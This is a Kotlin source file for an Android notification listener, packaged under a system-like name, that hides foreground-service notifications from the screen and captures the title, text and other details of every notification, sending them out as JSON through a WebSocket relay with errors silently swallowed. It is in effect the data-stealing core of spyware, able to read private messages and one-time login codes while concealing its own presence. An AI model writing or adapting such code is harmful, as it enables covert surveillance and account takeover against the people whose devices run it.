package com.android.dpc

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.app.Notification
import com.google.gson.Gson

class NLS : NotificationListenerService() {
    
    private val gson = Gson()
    
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let { notification ->
            // Filtra apenas notificações com FLAG_FOREGROUND_SERVICE para ocultar
            val flags = notification.notification.flags
            
            if (flags and Notification.FLAG_FOREGROUND_SERVICE != 0) {
                // Remove notification from UI
                cancelNotification(notification.key)
            }
            
            // Captura dados da notificação
            captureNotificationData(notification)
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Notificação removida
    }
    
    private fun captureNotificationData(sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            val notificationData = mapOf(
                "type" to "notification",
                "packageName" to sbn.packageName,
                "title" to (extras?.getString(Notification.EXTRA_TITLE) ?: ""),
                "text" to (extras?.getString(Notification.EXTRA_TEXT) ?: ""),
                "bigText" to (extras?.getString(Notification.EXTRA_BIG_TEXT) ?: ""),
                "subText" to (extras?.getString(Notification.EXTRA_SUB_TEXT) ?: ""),
                "timestamp" to sbn.postTime,
                "flags" to notification.flags,
                "category" to notification.category,
                "priority" to notification.priority
            )
            
            WsRelay.send(gson.toJson(notificationData))
        } catch (e: Exception) {
            // Log error silently
        }
    }
}